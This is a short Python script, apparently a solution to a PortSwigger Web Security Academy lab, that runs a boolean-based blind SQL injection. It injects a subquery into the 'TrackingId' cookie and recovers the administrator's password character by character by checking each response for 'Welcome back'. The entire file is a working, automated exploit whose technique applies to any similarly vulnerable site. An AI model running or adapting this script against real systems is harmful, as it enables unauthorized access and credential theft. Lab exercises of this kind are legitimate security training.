#/usr/bin/env python

from pwn import *
import requests
import sys
import signal
import string
import time

def def_handler(sig, frame):
    print("\nSaliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits

def SQLI():

    password = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Password")

    time.sleep(2)

    for position in range(1, 21):
        for character in characters:
            cookies = {
                'TrackingId': f"UToS6Nw9FkT1obdA' and (select substring(password,{position},1) from users where username='administrator')='{character}'-- -",
                'session': 'E5GG8BaJa7nw9i2nnJyi1tpIPcswmEnd'
            }

            p1.status(cookies["TrackingId"])

            r = requests.get("https://0a1500a7049223ca8110bb3d004700b5.web-security-academy.net", cookies=cookies)

            if "Welcome back" in r.text:
                password += character
                p2.status(password)
                print(password)
                break

if __name__ == "__main__":
    SQLI()
